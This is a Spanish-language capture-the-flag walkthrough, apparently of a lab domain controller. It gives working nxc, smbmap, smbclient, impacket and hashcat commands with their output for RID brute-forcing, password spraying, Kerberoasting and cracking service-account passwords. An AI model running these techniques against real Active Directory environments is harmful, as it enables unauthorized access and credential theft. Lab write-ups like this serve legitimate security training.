🔍 Enumeración de usuarios vía RID Brute-Force

Probamos enumerar usuarios con nxc usando la cuenta guest:

🖥️ RID Brute-Force
nxc smb 10.10.10.104 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}' | cut -d '\' -f 2 > domain_users.txt

🔑 Password Spraying

Sin credenciales válidas y sin resultados de AS-REP Roasting, probamos un ataque de password spraying comprobando si algún usuario tiene como contraseña su propio nombre:

🖥️ Password Spraying con NXC
nxc smb 10.10.10.104 -u domain_users.txt -p domain_users.txt --no-bruteforce --continue-on-success | grep '[+]' SMB 10.10.10.104 445 DC01 [+] SOUPEDECODE.LOCAL\ybob317:ybob317
✅
Credenciales obtenidas: ybob317 : ybob317

📂 Enumeración SMB — User Flag

Revisamos las carpetas compartidas accesibles con las credenciales obtenidas:

🖥️ SMBMap
smbmap -H 10.10.10.104 -u ybob317 -p ybob317 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin backup NO ACCESS C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share Users READ ONLY

Accedemos a la carpeta Users y obtenemos la primera flag:

🖥️ SMBClient — User Flag
smbclient //10.10.10.104/Users -U 'ybob317%ybob317' smb: \> cd ybob317\Desktop\ smb: \ybob317\Desktop\> dir desktop.ini AHS 282 Mon Jun 17 13:24:32 2024 user.txt A 32 Wed Jun 12 07:54:32 2024

🎟️ Kerberoasting

Con un usuario válido, procedemos a probar Kerberoasting para obtener tickets TGS de cuentas de servicio:

🖥️ Impacket GetUserSPNs
impacket-GetUserSPNs -request -dc-ip 10.10.10.104 -outputfile kerberoast_hashes.txt "SOUPEDECODE.LOCAL/ybob317:ybob317" ServicePrincipalName Name MemberOf PasswordLastSet ---------------------- -------------- -------- -------------------------- FTP/FileServer file_svc 2024-06-17 13:32:23 FW/ProxyServer firewall_svc 2024-06-17 13:28:32 HTTP/BackupServer backup_svc 2024-06-17 13:28:49 HTTP/WebServer web_svc 2024-06-17 13:29:04 HTTPS/MonitoringServer monitoring_svc 2024-06-17 13:29:18

Crackeamos los hashes con hashcat:

🖥️ Hashcat — Kerberoasting
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt file_svc : Password123!!
✅
Credenciales crackeadas: file_svc : Password123!!

💾 Backup Share — Machine Hashes

Con las credenciales de file_svc accedemos a la carpeta backup previamente inaccesible:

🖥️ SMBClient — Backup
smbclient //10.10.10.104/backup -U 'file_svc%Password123!!' smb: \> dir backup_extract.txt A 892 Mon Jun 17 04:41:05 2024
